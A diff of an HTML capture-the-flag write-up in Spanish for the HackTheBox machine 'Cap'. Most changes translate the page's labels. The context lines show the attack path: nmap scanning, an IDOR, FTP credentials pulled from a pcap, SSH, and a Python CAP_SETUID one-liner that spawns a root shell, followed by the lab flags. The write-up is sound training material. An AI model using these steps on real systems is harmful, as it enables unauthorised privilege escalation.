@@ -140,7 +140,7 @@
     .val-red    { color: var(--red); }
     .val-facil  { color: #00ffcc; }
 
-    /* ATTACK PATH */
+    /* RUTA DE ATAQUE */
     .attack-path { display: flex; flex-direction: column; gap: 0; }
     .ap-item { display: flex; align-items: flex-start; gap: 0.8rem; padding: 0.5rem 0; }
     .ap-dot { width: 8px; height: 8px; background: var(--green); border-radius: 50%; margin-top: 4px; flex-shrink: 0; box-shadow: 0 0 6px var(--green); }
@@ -310,23 +310,24 @@
 <div class="cursor-ring" id="cursorRing"></div>
 
 <nav>
-  <a href="../../index.html" class="nav-logo">BRANDEIKS_SEC</a>
-  <a href="https://brandeiks.github.io/writeups/" class="nav-back">volver al portafolio</a>
-</nav>
+    <a href="../../../index.html" class="nav-logo">BRANDEIKS_SEC</a>
+    <a href="../../../writeups/index.html" class="nav-back">ANÁLISIS</a>
+    <a href="../../../diccionario/index.html" class="nav-back">DICCIONARIO</a>
+  </nav>
 
 <!-- HERO -->
 <div class="writeup-hero">
   <div class="hero-grid"></div>
   <div class="hero-glow"></div>
   <div class="writeup-hero-content">
-    <p class="breadcrumb">
-      <a href="https://brandeiks.github.io/">brandeiks</a> /
-      <a href="https://brandeiks.github.io/writeups/">writeups</a> /
-      <a href="https://brandeiks.github.io/writeups/">hackthebox</a> /
+    <div class="breadcrumb">
+      <a href="../../../index.html">brandeiks</a> /
+      <a href="../../../writeups/index.html">análisis</a> /
+      <a href="../../../writeups/index.html">hackthebox</a> /
       <span>cap</span>
-    </p>
+    </div>
     <h1 class="writeup-title"><span style="color:var(--green)">Cap</span></h1>
-    <p class="writeup-subtitle">HackTheBox — Linux · OpenVPN → nmap → IDOR /data/0 → pcap FTP creds → SSH → Python3.8 CAP_SETUID → root</p>
+    <p class="writeup-subtitle">HackTheBox — Linux · OpenVPN → nmap → IDOR /data/0 → credenciales FTP en el pcap → SSH → Python3.8 CAP_SETUID → root</p>
     <div class="writeup-meta">
       <span class="meta-badge badge-facil">● FÁCIL</span>
       <span class="meta-badge badge-htb">HACKTHEBOX</span>
@@ -335,7 +336,7 @@
       <span class="meta-badge badge-pcap">PCAP · WIRESHARK</span>
       <span class="meta-badge badge-ssh">SSH</span>
       <span class="meta-badge badge-cap">CAP_SETUID · LPE</span>
-      <span class="meta-date">📅 Abril 2026 · By Brandeiks</span>
+      <span class="meta-date">📅 Abril 2026 · Por Brandeiks</span>
     </div>
   </div>
 </div>
@@ -366,13 +367,13 @@
       <div class="info-row"><span class="info-label">Plataforma</span><span class="info-val val-green">HackTheBox</span></div>
       <div class="info-row"><span class="info-label">OS</span><span class="info-val val-yellow">Linux (Ubuntu)</span></div>
       <div class="info-row"><span class="info-label">Dificultad</span><span class="info-val val-facil">Fácil</span></div>
-      <div class="info-row"><span class="info-label">IP Target</span><span class="info-val" style="color:var(--text)">10.129.2.33</span></div>
+      <div class="info-row"><span class="info-label">IP objetivo</span><span class="info-val" style="color:var(--text)">10.129.2.33</span></div>
       <div class="info-row"><span class="info-label">Web</span><span class="info-val val-cyan">Gunicorn</span></div>
       <div class="info-row"><span class="info-label">Usuario</span><span class="info-val val-cyan">nathan</span></div>
       <div class="info-row"><span class="info-label">Estado</span><span class="info-val val-green">● Pwned</span></div>
     </div>
     <div class="sidebar-box">
-      <p class="sidebar-title">// ATTACK PATH</p>
+      <p class="sidebar-title">// RUTA DE ATAQUE</p>
       <div class="attack-path">
         <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>openvpn</span> → conexión HTB</div></div>
         <div class="ap-line"></div>
@@ -382,7 +383,7 @@
         <div class="ap-line"></div>
         <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>IDOR</span> → /data/0</div></div>
         <div class="ap-line"></div>
-        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>Wireshark</span> → creds FTP</div></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>Wireshark</span> → credenciales FTP</div></div>
         <div class="ap-line"></div>
         <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>SSH</span> → nathan shell</div></div>
         <div class="ap-line"></div>
@@ -480,7 +481,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="cd Downloads && sudo openvpn Dedicated_Lab_Masker10.ovpn">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">VPN</span>
         <div><span class="prompt">$ </span><span class="cmd">cd <span class="arg">Downloads</span></span></div>
         <div><span class="prompt">$ </span><span class="cmd">sudo openvpn <span class="arg">Dedicated_Lab_Masker10.ovpn</span></span></div>
@@ -535,7 +536,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="ping 10.129.2.33 -c 3">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">PING</span>
         <div><span class="prompt">$ </span><span class="cmd">ping <span class="arg">10.129.2.33</span> <span class="flag">-c</span> <span class="arg">3</span></span></div>
       </div>
@@ -577,7 +578,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="sudo nmap -p- -sV 10.129.2.33 --min-rate 50000">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">ESCANEO</span>
         <div><span class="prompt">$ </span><span class="cmd">sudo nmap <span class="flag">-p-</span> <span class="flag">-sV</span> <span class="arg">10.129.2.33</span> <span class="flag">--min-rate</span> <span class="arg">50000</span></span></div>
       </div>
@@ -820,7 +821,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="ssh nathan@10.129.2.33">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">SSH</span>
         <div><span class="prompt">$ </span><span class="cmd">ssh <span class="arg">nathan@10.129.2.33</span></span></div>
       </div>
@@ -855,8 +856,8 @@
       </div>
 
       <div class="cmd-block" data-cmd="ls && cat user.txt">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
-        <span class="cmd-label">USER FLAG</span>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
+        <span class="cmd-label">BANDERA DE USUARIO</span>
         <div><span class="prompt" style="color:var(--green)">nathan@cap:~$ </span><span class="cmd">ls</span></div>
         <div style="margin-left:1.2rem; color:var(--text-dim);">user.txt</div>
         <div><span class="prompt" style="color:var(--green)">nathan@cap:~$ </span><span class="cmd">cat <span class="arg">user.txt</span></span></div>
@@ -869,7 +870,7 @@
     <!-- ===================== 08 PRIVESC ===================== -->
     <div class="section" id="privesc">
       <p class="section-label">// 08</p>
-      <h2 class="section-title">Escalada de Privilegios · CAP_SETUID</h2>
+      <h2 class="section-title">Escalada de privilegios · CAP_SETUID</h2>
       <div class="section-line"></div>
 
       <div class="step-marker">
@@ -901,7 +902,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="getcap -r / 2>/dev/null">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">ENUM CAPABILITIES</span>
         <div><span class="prompt" style="color:var(--green)">nathan@cap:~$ </span><span class="cmd">getcap <span class="flag">-r</span> <span class="arg">/</span> <span class="comment">2>/dev/null</span></span></div>
       </div>
@@ -972,7 +973,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="python3.8 -c 'import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\")'">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">PRIVESC</span>
         <div><span class="prompt" style="color:var(--green)">nathan@cap:~$ </span><span class="cmd">python3.8 <span class="flag">-c</span> <span class="arg">'import os; os.setuid(0); os.execl("/bin/sh", "sh")'</span></span></div>
         <div><span class="prompt-root"># </span><span class="cmd">whoami</span></div>
@@ -1014,8 +1015,8 @@
       </div>
 
       <div class="cmd-block" data-cmd="whoami && pwd && cd .. && ls && cd root && ls && cat root.txt">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
-        <span class="cmd-label">ROOT FLAG</span>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
+        <span class="cmd-label">BANDERA DE ROOT</span>
         <div><span class="prompt-root"># </span><span class="cmd">whoami</span></div>
         <div style="margin-left:1.2rem;"><span class="o-red">root</span></div>
         <div><span class="prompt-root"># </span><span class="cmd">pwd</span></div>
@@ -1035,11 +1036,11 @@
 
       <div class="cred-box">
         <div class="cred-item">
-          <div class="cred-label">USER FLAG</div>
+          <div class="cred-label">BANDERA DE USUARIO</div>
           <div class="cred-val">6b3dfda0408f9929587704c08e04e52a</div>
         </div>
         <div class="cred-item">
-          <div class="cred-label">ROOT FLAG</div>
+          <div class="cred-label">BANDERA DE ROOT</div>
           <div class="cred-val">51504efaa385f1d22d0883aae5b1e8bb</div>
         </div>
       </div>
@@ -1178,7 +1179,7 @@
         </div>
 
         <div class="glos-card">
-          <div class="glos-term">FTP en Texto Plano — Clear Text Credentials</div>
+          <div class="glos-term">FTP en Texto Plano — Clear Text Credenciales</div>
           <div class="glos-def">
             <strong>FTP (File Transfer Protocol)</strong>, definido en el RFC 959 de 1985, transmite
             todos sus datos —incluyendo credenciales de autenticación— sin ningún tipo de cifrado.
@@ -1237,7 +1238,7 @@
         </div>
 
         <div class="glos-card">
-          <div class="glos-term">CAP_SETUID — Escalada de Privilegios</div>
+          <div class="glos-term">CAP_SETUID — Escalada de privilegios</div>
           <div class="glos-def">
             <strong>CAP_SETUID</strong> es una Linux Capability que permite a un proceso
             llamar a las syscalls <code>setuid()</code>, <code>setgid()</code> y funciones
@@ -1306,9 +1307,9 @@
 
 <!-- FOOTER -->
 <footer>
-  <p>© 2026 <span>Brandon Zevallos Pastrana</span> — Writeup personal · HackTheBox</p>
-  <p>Built with <span>kali linux</span> &amp; <span>❤</span></p>
-</footer>
+    <p>© 2026 <span>Brandon Zevallos Pastrana</span> — Análisis de Cap · HackTheBox</p>
+    <p>Hecho con <span>kali linux</span> &amp; <span>❤</span></p>
+  </footer>
 
 <script>
   // ACTIVE TOC
